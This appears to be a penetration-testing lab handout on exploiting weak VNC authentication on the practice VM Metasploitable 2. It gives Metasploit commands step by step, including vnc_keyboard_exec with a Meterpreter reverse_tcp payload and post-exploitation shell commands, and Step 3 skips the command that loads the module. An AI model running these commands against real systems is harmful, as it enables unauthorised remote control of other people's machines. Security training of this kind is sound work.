# Task: Exploiting VNC Service on Metasploitable 2 (Port 5900)

### Learning Objectives

By the end of this exercise, you will be able to:

* Perform service enumeration on a target system.
* Identify the VNC service running on port `5900`.
* Use Metasploit to exploit weak authentication in VNC.
* Gain a remote Virtual Network Computing on Metasploitable 2.
* Understand the importance of secure configurations for remote desktop services.



### Background

Metasploitable 2 is an intentionally vulnerable Linux machine used for penetration testing practice. One of its services, **VNC (Virtual Network Computing)**, is exposed on port **5900**. VNC allows remote desktop access, but if misconfigured (like using weak authentication), attackers can gain control of the system.



### Lab Requirements

* Kali Linux (Attacker)
* Metasploitable 2 (Target)
* Both machines on the same network (e.g., VirtualBox/VMware Host-only or NAT network).



### Step 1: Reconnaissance with Nmap

Scan Metasploitable to find open ports:

```bash
nmap -sV -p 5900 <target_ip>
```

* `-sV` ‚Üí Detect service version
* `-p 5900` ‚Üí Scan only the VNC port

üëâ Expected Output:
Shows `5900/tcp open vnc`.

### Step 2: Search for Vulnerabilities in Metasploit

Start Metasploit:

```bash
msfconsole
```

Search for VNC-related exploits:
search vnc using the command line
```bash
grep scanner search vnc
```
* `grep scanner` ‚Üí scans and only search valuable info on the particular search
üëâ You should find modules like:

* `auxiliary/scanner/vnc/vnc_login`

### Step 3: Set-up Options

Set target IP:

```bash
set RHOSTS <target_ip>
run
```

### Step 4: Exploit and Gain Access

Now, attempt to interact with the session:

```bash
use exploit/multi/vnc/vnc_keyboard_exec
set RHOST <target_ip>
set PAYLOAD linux/x86/meterpreter/reverse_tcp
set LHOST <your_kali_ip>
exploit
```

üëâ Expected Result:
You get a **Meterpreter session** or a remote shell on Metasploitable.



### Step 5: Post-Exploitation

Once inside:

```bash
shell
whoami
uname -a
```

* Confirm you have remote access.
* Enumerate the system.


### Step 6: Discussion / Mitigation

* Why is running VNC without authentication dangerous?
* How should VNC be secured? (passwords, encryption, network restrictions, VPNs).



###  Deliverables for Students

* Nmap scan result screenshot.
* Proof of successful VNC exploitation (shell access).
* Short write-up: *‚ÄúHow could this vulnerability be prevented in a real system?‚Äù*
